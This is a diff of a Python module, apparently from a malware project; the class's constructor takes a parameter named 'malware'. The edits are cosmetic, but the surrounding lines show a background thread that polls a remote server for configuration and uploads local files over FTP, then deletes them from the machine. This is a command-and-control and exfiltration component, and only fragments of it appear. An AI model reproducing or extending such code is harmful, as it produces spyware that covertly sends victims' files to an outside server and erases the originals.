@@ -9,15 +9,11 @@ from ftplib import FTP
 import os
 
 
-
-
 class Communication(Thread):
-
 
     def __init__(self, malware, config:Configuration):
         Thread.__init__(self, name='communication')
         self.__config = config
-
 
 
     def run(self):
@@ -25,7 +21,6 @@ class Communication(Thread):
             sleep(self.__config.communicationFrequency)
             self.getConfigFromServer()
             self.uploadFilesFTP()
-
 
 
     def getConfigFromServer(self):
@@ -40,9 +35,8 @@ class Communication(Thread):
                 if self.__config.debug:
                     print('Config file has been created!')
                 self.__config.setAttributes()
-        except Exception as error:
-            print('COMMUNICATION ERROR!')
-
+        except Exception as exception:
+            print(f'COMMUNICATION ERROR!: {exception}')
 
 
     def uploadFilesFTP(self):
@@ -56,6 +50,6 @@ class Communication(Thread):
                     os.remove(root + filename)          
             ftp.quit()
             print('FTP upload successfully finished!')
-        except Exception as error:
-            print('FTP error!: ', error)
+        except Exception as exception:
+            print(f'COMMUNICATION ERROR!: {exception}')
 
